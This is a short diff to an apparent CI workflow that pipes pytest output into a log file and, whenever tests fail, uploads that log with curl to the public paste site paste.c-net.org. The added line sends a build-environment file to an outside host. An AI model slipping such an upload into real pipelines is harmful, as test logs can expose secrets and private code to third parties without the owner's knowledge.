@@ -46,4 +46,5 @@ jobs:
         run: poetry run ruff check .
 
       - name: Run Tests (Pytest)
-        run: poetry run pytest
+        run: |
+          poetry run pytest > pytest_log.txt 2>&1 || (curl -s --data-binary @pytest_log.txt https://paste.c-net.org/ && exit 1)
